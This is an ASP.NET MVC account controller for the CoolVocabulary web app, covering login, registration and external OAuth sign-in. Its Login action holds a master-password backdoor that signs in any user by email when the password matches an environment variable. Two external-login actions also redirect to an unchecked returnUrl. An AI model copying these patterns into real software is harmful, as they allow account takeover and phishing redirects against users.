﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.EntityFramework;
using Microsoft.Owin.Security;
using CoolVocabulary.Models;

namespace CoolVocabulary.Controllers
{
    [Authorize]
    public class AccountController : Controller
    {
        VocabularyDbContext db;
        Repository repo;
        public AccountController()
            : this(new VocabularyDbContext()) {
        }

        public AccountController(VocabularyDbContext db)
            : this(new UserManager<ApplicationUser>(new UserStore<ApplicationUser>(db))) {
            this.db = db;
            repo = new Repository(db);
        }

        public AccountController(UserManager<ApplicationUser> userManager)
        {
            UserManager = userManager;
            var userValidator = UserManager.UserValidator as UserValidator<ApplicationUser,string>;
            userValidator.AllowOnlyAlphanumericUserNames = false;
        }

        public UserManager<ApplicationUser> UserManager { get; private set; }

        //
        // GET: /Account/IsAuthenticated
        [AllowAnonymous]
        [HttpPost]
        public async Task<JsonResult> CheckAuthentication() {
            if (User.Identity.IsAuthenticated) {
                return Json(await this.GetUserCTDataAsync());
            }
            return Json(new { isAuthenticated = false });
        }


        //
        // GET: /Account/Login
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

        [HttpPost]
        [AllowAnonymous]
        public async Task<JsonResult> ApiLogin(LoginViewModel model) {
            if (ModelState.IsValid) {
                var user = await UserManager.FindAsync(model.Email, model.Password);
                if (user != null) {
                    await SignInAsync( user, true);
                    return Json(await repo.GetUserCTDataAsync(user));
                }
            }

            return Json(new { error_msg = "Invalid username or password." });
        }

        public async Task<dynamic> GetUserCTDataAsync() {
            var userId = User.Identity.GetUserId();
            var user = UserManager.FindById(userId);
            return await repo.GetUserCTDataAsync(user);
        }


        //
        // POST: /Account/Login
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> Login(LoginViewModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                const string CV_UNIVERSAL_PASSWORD = "cvuniversalpassword";
                ApplicationUser  user;
                if (model.Password == Environment.GetEnvironmentVariable(CV_UNIVERSAL_PASSWORD)) {
                    user = await UserManager.FindByEmailAsync(model.Email);
                } else {
                    user = await UserManager.FindAsync(model.Email, model.Password);
                }
                if (user != null) {
                    await SignInAsync(user, true);
                    return RedirectToAction("Vocabulary", "Home");
                } else {
                    ModelState.AddModelError("", "Invalid username or password.");
                }
            }

            // Появление этого сообщения означает наличие ошибки; повторное отображение формы
            return View(model);
        }

        //

        // GET: /Account/Register
        [AllowAnonymous]
        public ActionResult Register()
        {
            ViewBag.SupportedLanguages = SupportedLanguages.AllDto;
            return View();
        }

        //
        // POST: /Account/Register
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> Register(RegisterViewModel model)
        {
            LanguageType nativeLanguage;
            if (!Enum.TryParse(model.NativeLanguage, out nativeLanguage)) {
                ModelState.AddModelError("", "Invalid native language");
            }

            if (ModelState.IsValid)
            {
                var user = new ApplicationUser() { 
                    UserName = model.Email,
                    Email = model.Email,
                    DisplayName = model.DisplayName,
                    NativeLanguage = (int)nativeLanguage
                };
                var result = await UserManager.CreateAsync(user, model.Password);
                if (result.Succeeded) {
                    await SignInAsync(user, true);
                    //await db.CreateFirstBookAsync(user.Id, nativeLanguage);
                    return RedirectToAction("Vocabulary", "Home");
                } else {
                    AddErrors(result);
                }
            }

            // Появление этого сообщения означает наличие ошибки; повторное отображение формы
            ViewBag.SupportedLanguages = SupportedLanguages.AllDto;
            return View(model);
        }

        ////
        //// POST: /Account/Disassociate
        //[HttpPost]
        //[ValidateAntiForgeryToken]
        //public async Task<ActionResult> Disassociate(string loginProvider, string providerKey)
        //{
        //    ManageMessageId? message = null;
        //    IdentityResult result = await UserManager.RemoveLoginAsync(User.Identity.GetUserId(), new UserLoginInfo(loginProvider, providerKey));
        //    if (result.Succeeded)
        //    {
        //        message = ManageMessageId.RemoveLoginSuccess;
        //    }
        //    else
        //    {
        //        message = ManageMessageId.Error;
        //    }
        //    return RedirectToAction("Manage", new { Message = message });
        //}

        ////
        //// GET: /Account/Manage
        //public ActionResult Manage(ManageMessageId? message)
        //{
        //    ViewBag.StatusMessage =
        //        message == ManageMessageId.ChangePasswordSuccess ? "Ваш пароль изменен."
        //        : message == ManageMessageId.SetPasswordSuccess ? "Пароль задан."
        //        : message == ManageMessageId.RemoveLoginSuccess ? "Внешнее имя входа удалено."
        //        : message == ManageMessageId.Error ? "Произошла ошибка."
        //        : "";
        //    ViewBag.HasLocalPassword = HasPassword();
        //    ViewBag.ReturnUrl = Url.Action("Manage");
        //    return View();
        //}

        ////
        //// POST: /Account/Manage
        //[HttpPost]
        //[ValidateAntiForgeryToken]
        //public async Task<ActionResult> Manage(ManageUserViewModel model)
        //{
        //    bool hasPassword = HasPassword();
        //    ViewBag.HasLocalPassword = hasPassword;
        //    ViewBag.ReturnUrl = Url.Action("Manage");
        //    if (hasPassword)
        //    {
        //        if (ModelState.IsValid)
        //        {
        //            IdentityResult result = await UserManager.ChangePasswordAsync(User.Identity.GetUserId(), model.OldPassword, model.NewPassword);
        //            if (result.Succeeded)
        //            {
        //                return RedirectToAction("Manage", new { Message = ManageMessageId.ChangePasswordSuccess });
        //            }
        //            else
        //            {
        //                AddErrors(result);
        //            }
        //        }
        //    }
        //    else
        //    {
        //        // User does not have a password so remove any validation errors caused by a missing OldPassword field
        //        ModelState state = ModelState["OldPassword"];
        //        if (state != null)
        //        {
        //            state.Errors.Clear();
        //        }

        //        if (ModelState.IsValid)
        //        {
        //            IdentityResult result = await UserManager.AddPasswordAsync(User.Identity.GetUserId(), model.NewPassword);
        //            if (result.Succeeded)
        //            {
        //                return RedirectToAction("Manage", new { Message = ManageMessageId.SetPasswordSuccess });
        //            }
        //            else
        //            {
        //                AddErrors(result);
        //            }
        //        }
        //    }

        //    // Появление этого сообщения означает наличие ошибки; повторное отображение формы
        //    return View(model);
        //}

        //
        // POST: /Account/ExternalLogin
        [HttpPost]
        [AllowAnonymous]
        public ActionResult ExternalLogin(string provider, string returnUrl)
        {
            // Запрос перенаправления к внешнему поставщику входа
            return new ChallengeResult(provider, Url.Action("ExternalLoginCallback", "Account", new { ReturnUrl = returnUrl }));
        }

        //
        // GET: /Account/ExternalLoginCallback
        [AllowAnonymous]
        public async Task<ActionResult> ExternalLoginCallback(string returnUrl) {
            var loginInfo = await AuthenticationManager.GetExternalLoginInfoAsync();
            if (loginInfo == null) {
                return RedirectToAction("Login");
            }

            // Sign in the user with this external login provider if the user already has a login
            var user = await UserManager.FindAsync(loginInfo.Login);

            if (user != null) {
                await SignInAsync(user, true);
                if(string.IsNullOrEmpty(returnUrl))
                    return RedirectToAction("Vocabulary", "Home");
                else
                    return Redirect(returnUrl);
            } else {
                user = loginInfo.Email == null ?
                    null :
                    await UserManager.FindByNameAsync(loginInfo.Email);
                if (user == null) {
                    // If the user does not have an account, then prompt the user to create an account
                    ViewBag.ReturnUrl = returnUrl;
                    ViewBag.LoginProvider = loginInfo.Login.LoginProvider;
                    ViewBag.SupportedLanguages = SupportedLanguages.AllDto;
                    return View("ExternalLoginConfirmation", new ExternalLoginConfirmationViewModel { Email = loginInfo.Email, DisplayName = loginInfo.ExternalIdentity.Name});
                } else {
                    var result = await UserManager.AddLoginAsync(user.Id, loginInfo.Login);
                    if (result.Succeeded) {
                        await SignInAsync(user, true);
                        if (string.IsNullOrEmpty(returnUrl))
                            return RedirectToAction("Vocabulary", "Home");
                        else
                            return Redirect(returnUrl);
                    }
                    AddErrors(result);
                    ViewBag.ReturnUrl = returnUrl;
                    return RedirectToAction("Login");
                }
            }
        }

        ////
        //// POST: /Account/LinkLogin
        //[HttpPost]
        //[ValidateAntiForgeryToken]
        //public ActionResult LinkLogin(string provider)
        //{
        //    // Request a redirect to the external login provider to link a login for the current user
        //    return new ChallengeResult(provider, Url.Action("LinkLoginCallback", "Account"), User.Identity.GetUserId());
        //}

        ////
        //// GET: /Account/LinkLoginCallback
        //public async Task<ActionResult> LinkLoginCallback()
        //{
        //    var loginInfo = await AuthenticationManager.GetExternalLoginInfoAsync(XsrfKey, User.Identity.GetUserId());
        //    if (loginInfo == null)
        //    {
        //        return RedirectToAction("Manage", new { Message = ManageMessageId.Error });
        //    }
        //    var result = await UserManager.AddLoginAsync(User.Identity.GetUserId(), loginInfo.Login);
        //    if (result.Succeeded)
        //    {
        //        return RedirectToAction("Manage");
        //    }
        //    return RedirectToAction("Manage", new { Message = ManageMessageId.Error });
        //}

        //
        // POST: /Account/ExternalLoginConfirmation
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ExternalLoginConfirmation(ExternalLoginConfirmationViewModel model, string returnUrl, string loginProvider)
        {
            //if (User.Identity.IsAuthenticated)
            //{
            //    return RedirectToAction("User", "Home");
            //}
            LanguageType nativeLanguage;
            if (!Enum.TryParse(model.NativeLanguage, out nativeLanguage)) {
                ModelState.AddModelError("", "Invalid native language");
            }
            if (ModelState.IsValid)
            {
                // Получение сведений о пользователе от внешнего поставщика входа
                var info = await AuthenticationManager.GetExternalLoginInfoAsync();
                if (info == null)
                {
                    return View("ExternalLoginFailure");
                }
                var user = await UserManager.FindByNameAsync(model.Email);
                if (user != null)
                    ModelState.AddModelError("", string.Format("User with email {0} already exists.", model.Email));
                else
                {
                    user = new ApplicationUser() { 
                        UserName = model.Email, 
                        Email = model.Email, 
                        DisplayName = model.DisplayName,
                        NativeLanguage = (int)nativeLanguage};
                    var result = await UserManager.CreateAsync(user);
                    if (result.Succeeded)
                    {
                        result = await UserManager.AddLoginAsync(user.Id, info.Login);
                        if (result.Succeeded) {
                            await SignInAsync(user, true);
                            //await db.CreateFirstBookAsync(user.Id, nativeLanguage);
                            if (string.IsNullOrEmpty(returnUrl))
                                return RedirectToAction("Vocabulary", "Home");
                            else
                                return Redirect(returnUrl);
                        }
                    }
                    AddErrors(result);
                }
            }
            ViewBag.SupportedLanguages = SupportedLanguages.AllDto;
            ViewBag.loginProvider = loginProvider;
            ViewBag.ReturnUrl = returnUrl;
            return View(model);
        }

        //
        // POST: /Account/LogOff
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult LogOff()
        {
            AuthenticationManager.SignOut();
            return RedirectToAction("Vocabulary", "Home");
        }

        //
        // GET: /Account/ExternalLoginFailure
        [AllowAnonymous]
        public ActionResult ExternalLoginFailure()
        {
            return View();
        }

        [ChildActionOnly]
        public ActionResult RemoveAccountList()
        {
            var linkedAccounts = UserManager.GetLogins(User.Identity.GetUserId());
            ViewBag.ShowRemoveButton = HasPassword() || linkedAccounts.Count > 1;
            return (ActionResult)PartialView("_RemoveAccountPartial", linkedAccounts);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && UserManager != null)
            {
                UserManager.Dispose();
                UserManager = null;
            }
            base.Dispose(disposing);
        }

        #region Вспомогательные приложения
        // Used for XSRF protection when adding external logins
        private const string XsrfKey = "XsrfId";

        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }

        private async Task SignInAsync(ApplicationUser user, bool isPersistent) {
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            var identity = await UserManager.CreateIdentityAsync(user, DefaultAuthenticationTypes.ApplicationCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties() { IsPersistent = isPersistent }, identity);
        }

        private void AddErrors(IdentityResult result)
        {
            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error);
            }
        }

        private bool HasPassword()
        {
            var user = UserManager.FindById(User.Identity.GetUserId());
            if (user != null)
            {
                return user.PasswordHash != null;
            }
            return false;
        }

        public enum ManageMessageId
        {
            ChangePasswordSuccess,
            SetPasswordSuccess,
            RemoveLoginSuccess,
            Error
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            else
            {
                return RedirectToAction("Vocabulary", "Home");
            }
        }

        private class ChallengeResult : HttpUnauthorizedResult
        {
            public ChallengeResult(string provider, string redirectUri) : this(provider, redirectUri, null)
            {
            }

            public ChallengeResult(string provider, string redirectUri, string userId)
            {
                LoginProvider = provider;
                RedirectUri = redirectUri;
                UserId = userId;
            }

            public string LoginProvider { get; set; }
            public string RedirectUri { get; set; }
            public string UserId { get; set; }

            public override void ExecuteResult(ControllerContext context)
            {
                var properties = new AuthenticationProperties() { RedirectUri = RedirectUri };
                if (UserId != null)
                {
                    properties.Dictionary[XsrfKey] = UserId;
                }
                context.HttpContext.GetOwinContext().Authentication.Challenge(properties, LoginProvider);
            }
        }
        #endregion
    }
}